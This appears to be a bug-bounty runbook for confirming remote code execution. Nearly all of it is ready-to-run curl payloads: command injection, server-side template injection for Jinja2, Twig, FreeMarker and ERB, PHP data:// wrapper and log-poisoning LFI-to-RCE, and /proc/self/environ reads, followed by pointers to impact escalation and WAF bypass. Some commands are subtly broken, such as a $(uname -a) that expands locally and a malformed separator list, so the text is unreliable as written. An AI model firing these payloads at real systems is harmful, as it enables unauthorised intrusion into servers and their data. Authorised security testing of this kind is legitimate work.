# RCE Verify Runbook

## Purpose
Confirm RCE with high confidence using multiple independent payloads. Capture evidence suitable for a bug bounty report.

## Variables
- `$TARGET_URL` — confirmed vulnerable endpoint
- `$VULN_PARAM` — confirmed injectable parameter
- `$OUTDIR` — output directory
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/rce`

## Workflow A — Command Injection Verification

### A1. Run `id` command via injection
```bash
curl -sk -v "$TARGET_URL?$VULN_PARAM=;id" -o "$EVIDENCE_DIR/cmd-inj-id-response.txt" 2>"$EVIDENCE_DIR/cmd-inj-id-request.txt"
```

### A2. Run `whoami` command via injection
```bash
curl -sk -v "$TARGET_URL?$VULN_PARAM=|whoami" -o "$EVIDENCE_DIR/cmd-inj-whoami-response.txt" 2>"$EVIDENCE_DIR/cmd-inj-whoami-request.txt"
```

### A3. Run `uname -a` for OS/environment info
```bash
curl -sk -v "$TARGET_URL?$VULN_PARAM=$(uname -a)" -o "$EVIDENCE_DIR/cmd-inj-uname-response.txt" 2>"$EVIDENCE_DIR/cmd-inj-uname-request.txt"
```

### A4. Verify with alternative separators if primary fails
```bash
for sep in ';' '|' '||' '&' '&&' '$(' ''\''' backtick='`'; do
  curl -sk -v "$TARGET_URL?$VULN_PARAM=${sep}whoami" -o "$EVIDENCE_DIR/cmd-inj-alt-$sep-response.txt" 2>"$EVIDENCE_DIR/cmd-inj-alt-$sep-request.txt"
  grep -qE 'root|www-data|apache|tomcat|nobody' "$EVIDENCE_DIR/cmd-inj-alt-$sep-response.txt" && echo "VERIFIED SEPARATOR: $sep" >> "$EVIDENCE_DIR/verification-log.txt"
done
```

### A5. Full command execution evidence (pwd, ls, ifconfig)
```bash
curl -sk -v "$TARGET_URL?$VULN_PARAM=;pwd;ls -la;/sbin/ifconfig" -o "$EVIDENCE_DIR/cmd-inj-recon-response.txt" 2>"$EVIDENCE_DIR/cmd-inj-recon-request.txt"
```

## Workflow B — SSTI Verification (Jinja2)
```bash
curl -sk -v "$TARGET_URL?$VULN_PARAM={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}" -o "$EVIDENCE_DIR/ssti-jinja2-id-response.txt" 2>"$EVIDENCE_DIR/ssti-jinja2-id-request.txt"
grep -qE 'uid=|gid=' "$EVIDENCE_DIR/ssti-jinja2-id-response.txt" && echo "SSTI RCE CONFIRMED (Jinja2): $TARGET_URL" >> "$EVIDENCE_DIR/verification-log.txt"
```

## Workflow C — SSTI Verification (Twig)
```bash
curl -sk -v "$TARGET_URL?$VULN_PARAM={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" -o "$EVIDENCE_DIR/ssti-twig-id-response.txt" 2>"$EVIDENCE_DIR/ssti-twig-id-request.txt"
```

## Workflow D — SSTI Verification (FreeMarker)
```bash
curl -sk -v "$TARGET_URL?$VULN_PARAM=<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}" -o "$EVIDENCE_DIR/ssti-freemarker-id-response.txt" 2>"$EVIDENCE_DIR/ssti-freemarker-id-request.txt"
```

## Workflow E — SSTI Verification (ERB/Ruby)
```bash
curl -sk -v "$TARGET_URL?$VULN_PARAM=<%= system('id') %>" -o "$EVIDENCE_DIR/ssti-erb-id-response.txt" 2>"$EVIDENCE_DIR/ssti-erb-id-request.txt"
```

## Workflow F — LFI to RCE via PHP Wrappers
### F1. Data wrapper to PHP code execution
```bash
curl -sk -v "$TARGET_URL?$VULN_PARAM=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+" -o "$EVIDENCE_DIR/lfi-php-data-response.txt" 2>"$EVIDENCE_DIR/lfi-php-data-request.txt"
```

### F2. Log poisoning — inject PHP into User-Agent
```bash
curl -sk "$TARGET_URL" -H "User-Agent: <?php system('id'); ?>"
curl -sk -v "$TARGET_URL?$VULN_PARAM=/var/log/apache2/access.log" -o "$EVIDENCE_DIR/lfi-logpoison-response.txt" 2>"$EVIDENCE_DIR/lfi-logpoison-request.txt"
```

### F3. /proc/self/environ probe
```bash
curl -sk -v "$TARGET_URL?$VULN_PARAM=/proc/self/environ" -o "$EVIDENCE_DIR/lfi-proc-environ-response.txt" 2>"$EVIDENCE_DIR/lfi-proc-environ-request.txt"
```

## Verification Check
```bash
for evidence_file in "$EVIDENCE_DIR"/*-response.txt; do
  if grep -qE 'uid=[0-9]+\([a-zA-Z]+\)|root:|SYSTEM' "$evidence_file"; then
    echo "VERIFIED: $(basename "$evidence_file")" >> "$EVIDENCE_DIR/verification-log.txt"
  fi
done
cat "$EVIDENCE_DIR/verification-log.txt"
```

## Stop Conditions
- Any response containing `uid=` with valid user info -> RCE confirmed, stop probing
- DNS/HTTP callback received at collaborator -> RCE confirmed via OOB
- All payloads return 403/400 consistently -> WAF blocking
- Three distinct payload types all fail -> likely false positive

## Evidence to Capture
- Full `curl -v` request for each successful payload
- Response body for each successful payload
- Timestamp of verification (`date -u`)
- Tool versions (`curl --version`)

## Next Routing
- RCE confirmed -> `runbooks/04-impact-escalation.md`
- Blocked by WAF -> attempt encoding bypass, then escalate
- Cannot verify any vector -> `runbooks/06-false-positive-filter.md`
